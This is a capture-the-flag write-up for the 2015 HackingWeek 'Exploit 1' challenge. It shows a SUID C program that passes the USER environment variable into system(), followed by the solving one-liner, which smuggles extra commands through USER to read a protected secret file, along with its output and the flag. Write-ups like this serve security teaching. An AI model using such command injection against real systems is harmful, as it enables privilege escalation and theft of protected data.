# HackingWeek CTF 2015: Exploit 1

**Category:** exploit |
**Points:** 860 |
**Solves:** 77 |
**Description:**

> Connectez-vous en tant que <code>guest</code> (mot de passe: <code>shu1eKoo</code>) sur la machine <code>37.187.22.21</code>.<br>
> Vous trouverez la clef de validation cach√©e dans le fichier <code>/home/exploit01/.secret</code>.
>
> ```
> $> ssh guest@37.187.22.21
> ```

___

## Write-up

This task is an exploit task.  
We are given a shell on a remote server.  
The source code is also given :

```C
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int
main()
{
  char *buffer = NULL;
  gid_t gid = getegid();
  uid_t uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  asprintf(&buffer, "/bin/echo %s is using this program!", getenv("USER"));
  system(buffer);

  return EXIT_SUCCESS;
}
```		

The goal is pretty obvious : for every exploiting task, we need to take
advantage of an SUID binary, and read the content of
/home/exploit<nb>/.secret.  
This task is the first one, and is pretty easy : there is an unchecked call to
system() with an environment variable.  
It is possible for a user to change the USER variable either by exporting it,
or prepending `USER='foo'` before runing the binary.  
It makes it possible to run commands easilly :  
> `USER=';whoami; cat ../.secret #' ./vulnerable`  
> 
> exploit01  
> raht6ae1Ue

**Flag**: raht6ae1Ue
